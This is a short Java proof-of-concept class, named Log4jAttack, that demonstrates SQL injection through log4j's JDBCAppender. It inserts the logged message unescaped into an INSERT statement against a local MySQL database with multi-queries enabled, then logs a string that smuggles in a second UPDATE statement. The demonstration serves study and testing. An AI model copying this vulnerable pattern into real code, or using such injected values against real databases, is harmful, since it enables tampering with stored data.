package org.example;

import org.apache.log4j.Logger;
import org.apache.log4j.jdbc.JDBCAppender;

public class Log4jAttack {

    static Logger log = Logger.getLogger(Log4jAttack.class);

    static {
        JDBCAppender jdbcAppender = new JDBCAppender();
        jdbcAppender.setURL("jdbc:mysql://localhost:3306/cve?allowMultiQueries=true");
        jdbcAppender.setDriver("com.mysql.cj.jdbc.Driver");
        jdbcAppender.setUser("me");
        jdbcAppender.setPassword("secret");
        jdbcAppender.setSql("INSERT INTO logs (message) VALUES ('%m')");
        log.addAppender(jdbcAppender);
    }

    public static void main(String[] args) {
        String userInput = "text'); UPDATE logs SET message=('hacked";
        log.info(userInput);
    }
}
